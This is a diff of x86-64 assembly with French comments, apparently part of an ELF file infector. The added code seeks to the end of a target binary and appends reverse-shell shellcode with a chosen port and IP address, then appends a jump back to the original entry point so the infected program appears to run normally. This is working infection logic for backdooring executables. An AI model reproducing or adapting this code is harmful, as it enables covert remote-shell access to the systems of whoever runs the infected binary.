@@ -406,3 +406,110 @@ mov r15, buffer
     mov rdx, 8         ; p_align est un uint64_t
     syscall
 
+; =============== Ajout shell code  part 1 =================
+    mov rax, 8
+    mov rsi, 0
+    mov rdx, 2        ; fin du fichier
+    syscall
+
+    mov rax, 1
+    mov rsi, reverse_shell_1
+    mov rdx, reverse_shell_1_len
+    syscall
+
+    ; =============== Ajout port (2 octets, big endian) =================
+    mov rax, 8
+    mov rsi, 0
+    mov rdx, 2        ; fin du fichier
+    syscall
+
+    mov rax, 1
+    mov rsi, port_result
+    mov rdx, 2
+    syscall
+
+    ; =============== Ajout IP shell code =================
+    mov rax, 8
+    mov rsi, 0
+    mov rdx, 2        ; fin du fichier
+    syscall
+
+    mov rax, 1
+    mov rsi, ip_result
+    mov rdx, 4
+    syscall
+
+; =============== Ajout shell code  part 2 =================
+    mov rax, 8          
+    mov rsi, 0 
+    mov rdx, 2        ; fin du fichier 
+    syscall  
+
+    mov rax, 1         
+    mov rsi, reverse_shell_2  
+    mov rdx, reverse_shell_2_len
+    syscall      
+
+;=============================================================
+; =============== Ajout instruction de saut  =================
+    mov rax, 8          
+    mov rsi, 0 
+    mov rdx, 2        ; fin du fichier 
+    syscall  
+
+    mov rax, 1         
+    mov rsi, jump_insctruction  
+    mov rdx, 2
+    syscall    
+
+; =============== Ajout offset a sauter  =================
+    mov rax, 8          
+    mov rsi, 0 
+    mov rdx, 2        ; fin du fichier 
+    syscall  
+
+    mov rax, 1    
+    mov rsi, old_entry_point
+    mov rdx, 4     
+    syscall
+      
+; =============== jump  =================
+    mov rax, 8          
+    mov rsi, 0 
+    mov rdx, 2        ; fin du fichier 
+    syscall  
+
+    mov rax, 1         
+    mov rsi, jump
+    mov rdx, jump_len
+    syscall
+      
+
+sortie:
+    ;fermeture fichier
+    mov rax, 3          
+    syscall  
+
+    ;message de fin
+    mov rdi, 1             
+    mov rax, 1              
+    mov rsi, msg_fin      
+    mov rdx, msg_fin_len
+    syscall 
+
+    ; Code de sortie
+    mov rax, 60    
+    mov rdi, 0    
+    syscall     
+
+error:
+    mov rax, 1
+    mov rdi, 1
+    mov rsi, msg_error
+    mov rdx, msg_error_len
+    syscall
+
+    mov rax, 60
+    mov rdi, 1
+    syscall
+
